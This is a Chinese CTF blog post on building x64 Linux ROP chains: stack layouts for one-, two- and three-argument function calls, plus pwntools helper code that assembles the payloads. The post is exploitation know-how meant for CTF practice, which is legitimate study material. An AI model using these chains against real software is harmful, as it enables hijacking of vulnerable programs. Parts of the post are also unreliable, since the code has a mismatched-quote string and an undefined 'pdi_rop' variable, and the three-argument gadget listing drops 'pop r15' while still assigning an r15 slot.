---
layout: post
title: linux x64 rop利用总结
categories:
  - ctf
  - pwn
  - 漏洞利用
url: 371.html
id: 371
comments: false
date: 2017-01-02 23:51:14
tags:
---

### \* 以下的rop gadget均可在linux x64 gcc编译的程序中找到

### 1\. 一个参数的函数调用

address   ----------  pop rdi, ret
value     ----------  rdi
func_addr ----------  plt  或者 函数首地址

不加最终的返回地址，大小为 **8*3** 字节

### 2\. 两个参数的函数调用

address   ----------  pop rsi, pop r15, ret
value     ----------  rsi
address   ----------  pop rdi, ret
value     ----------  rdi
func_addr ----------  plt 或者 函数首地址

不加最终的返回地址， 大小为**8*5**字节

### 3\. 三个参数的函数调用

address  -----------  pop rbx, pop rbp, pop r12, pop r13, pop r14,
value    -----------  rbx (0)
value    -----------  rbp (1)
value    -----------  r12 存放函数地址的地址（如got表项地址或者某个可写数据区的地址）
value    -----------  r13 (rdx param3）
value    -----------  r14 (rsi  param2）
value    -----------  r15 (edi param1, 注意低4字节有效）

address  -----------  mov , mov, mov, call, ...., ret 地址
value    -----------  padding
value    -----------  rbx (padding, 也可作为下一次继续调用三参数函数的值）
value    -----------  rbp (同上）
value    -----------  r12 (同上）
value    -----------  r13 (同上）
value    -----------  r14 (同上）
value    -----------  r15 (同上）

不加最终的返回地址，大小为**8*15**字节 在缓冲区溢出时，要注意对应的rop gadget的大小

### 最后附不同数量参数函数调用的代码：（pwntools）

def one\_param\_func\_payload(rdi\_rop, rdi, func_addr):
    payload = p64(rdi_rop)
    payload += p64(rdi)
    payload += p64(func_addr)
    return payload

def two\_param\_func\_payload(rsi\_rop, rsi, rdi\_rop, rdi, func\_addr):
    payload = p64(rsi_rop)
    payload += p64(rsi)
    payload += p64(rdi_rop)
    payload += p64(rdi)
    payload += p64(func_addr)
    return payload

def three\_param\_func\_payload(setreg\_rop, func\_addr\_addr, param1, param2, param3, callptr_rop):
    payload = p64(setreg_rop)
    payload += p64(0)
    payload += p64(1)
    payload += p64(func\_addr\_addr)
    payload += p64(param3)
    payload += p64(param2)
    payload += p64(param1)
    payload += p64(callptr_rop)
    payload += 'a'*(8*7)
    return payload

利用pwntools提供的ROP还可以更加精简上述调用，自动完成查找相应rop gadget的功能

binary_path = "./pwnme'
binary = ELF(binary_path)
rop = ROP(binary)

def one\_param\_func\_payload(func\_addr, param):
    rdi\_rop = rop.find\_gadget(\['pop rdi', 'ret'\]).address
    payload = p64(pdi_rop)
    payload += p64(param)
    payload += p64(func_addr)
    return payload

def two\_param\_func\_payload(func\_addr, param1, param2):
    rsi\_rop = rop.find\_gadget(\['pop rsi', 'pop r15', 'ret'\]).address
    payload = p64(rsi_rop)
    payload += p64(param2)
    payload += one\_param\_func\_payload(func\_addr, param1)
    return payload

利用[roputils](https://github.com/inaz2/roputils)可以完成更多参数函数payload的构建